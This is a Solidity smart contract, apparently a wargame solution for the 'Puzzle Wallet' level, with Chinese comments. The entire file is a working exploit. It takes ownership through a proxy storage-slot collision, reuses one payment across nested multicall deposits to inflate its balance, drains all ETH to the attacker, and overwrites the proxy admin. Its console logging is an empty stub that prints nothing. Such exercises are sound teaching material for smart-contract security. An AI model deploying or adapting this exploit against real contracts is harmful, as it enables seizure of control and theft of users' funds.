// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
    function admin() external view returns (address);
    function pendingAdmin() external view returns (address);
}

interface IPuzzleWallet {
    function owner() external view returns (address);
    function maxBalance() external view returns (uint256);
    function whitelisted(address) external view returns (bool);
    function balances(address) external view returns (uint256);
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract PuzzleWalletAttack {
    IPuzzleProxy public proxy;
    IPuzzleWallet public wallet;
    address public attacker;
    
    constructor(address _proxy) {
        proxy = IPuzzleProxy(_proxy);
        wallet = IPuzzleWallet(_proxy);
        attacker = msg.sender;
    }
    
    function attack() external payable {
        require(msg.value >= 0.001 ether, "Need at least 0.001 ETH");
        
        uint256 contractBalance = address(wallet).balance;
        require(contractBalance > 0, "Contract has no balance");
        
        console.log("=== Step 0: Initial State ===");
        console.log("Contract balance:", contractBalance);
        console.log("Owner:", wallet.owner());
        console.log("Admin:", proxy.admin());
        
        // Step 1: 成为 owner（利用存储槽冲突）
        console.log("\n=== Step 1: Become owner ===");
        proxy.proposeNewAdmin(address(this));
        require(wallet.owner() == address(this), "Failed to become owner");
        console.log("New owner:", wallet.owner());
        
        // Step 2: 加入白名单
        console.log("\n=== Step 2: Add to whitelist ===");
        wallet.addToWhitelist(address(this));
        require(wallet.whitelisted(address(this)), "Failed to whitelist");
        console.log("Whitelisted:", wallet.whitelisted(address(this)));
        
        // Step 3: 利用 multicall 重入虚增余额
        console.log("\n=== Step 3: Inflate balance ===");
        
        // 构造 deposit() 调用数据
        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSelector(wallet.deposit.selector);
        
        // 构造嵌套 multicall
        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = abi.encodeWithSelector(wallet.deposit.selector);
        multicallData[1] = abi.encodeWithSelector(
            wallet.multicall.selector,
            depositData
        );
        
        // 发送 0.001 ETH，但余额记录会是 0.002 ETH
        wallet.multicall{value: 0.001 ether}(multicallData);
        
        uint256 myBalance = wallet.balances(address(this));
        console.log("My recorded balance:", myBalance);
        require(myBalance == 0.002 ether, "Balance inflation failed");
        
        // Step 4: 掏空合约
        console.log("\n=== Step 4: Drain contract ===");
        
        // 提取所有 ETH（包括合约原有的余额）
        uint256 totalToWithdraw = contractBalance + 0.001 ether;
        wallet.execute(attacker, totalToWithdraw, "");
        
        uint256 newContractBalance = address(wallet).balance;
        console.log("New contract balance:", newContractBalance);
        require(newContractBalance == 0, "Failed to drain");
        
        // Step 5: 成为 admin（利用存储槽冲突）
        console.log("\n=== Step 5: Become admin ===");
        wallet.setMaxBalance(uint256(uint160(attacker)));
        
        address newAdmin = proxy.admin();
        console.log("New admin:", newAdmin);
        require(newAdmin == attacker, "Failed to become admin");
        
        console.log("\n=== Attack Success! ===");
        console.log("You are now the admin!");
    }
    
    // 接收 ETH
    receive() external payable {}
}

// 用于 console.log
library console {
    function log(string memory s) internal pure {}
    function log(string memory s, uint256 x) internal pure {}
    function log(string memory s, address x) internal pure {}
    function log(string memory s, bool x) internal pure {}
}